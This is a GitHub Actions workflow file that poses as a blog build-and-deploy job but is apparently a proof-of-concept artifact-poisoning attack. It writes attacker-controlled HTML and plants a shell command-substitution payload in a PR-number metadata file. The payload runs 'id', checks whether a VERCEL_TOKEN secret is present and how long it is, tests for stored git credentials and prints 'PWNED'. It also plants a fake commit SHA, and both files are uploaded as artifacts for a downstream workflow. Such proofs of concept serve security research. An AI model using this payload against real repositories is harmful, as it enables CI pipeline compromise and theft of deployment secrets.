name: Build & Deploy

on:
  pull_request:

jobs:
  build-and-deploy:
    name: Build & Deploy
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v5

    - name: Build the blog
      run: |
        mkdir -p dist prmeta
        echo '<html>attacker controlled preview</html>' > dist/index.html
        cat > prmeta/pr_number.txt <<'PAYLOAD'
        $(id; echo "SECRET_PRESENT=${VERCEL_TOKEN:+YES}" >&2; echo "TOKEN_LEN=${#VERCEL_TOKEN}" >&2; git config --get http.https://github.com/.extraheader >/dev/null 2>&1 && echo GITCRED=YES >&2; echo PWNED)
        PAYLOAD
        echo aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa > prmeta/pr_sha.txt

    - name: Upload dist artifact
      uses: actions/upload-artifact@v7
      with:
        name: dist
        path: dist/

    - name: Upload PR metadata
      uses: actions/upload-artifact@v7
      with:
        name: pr-metadata
        path: prmeta/
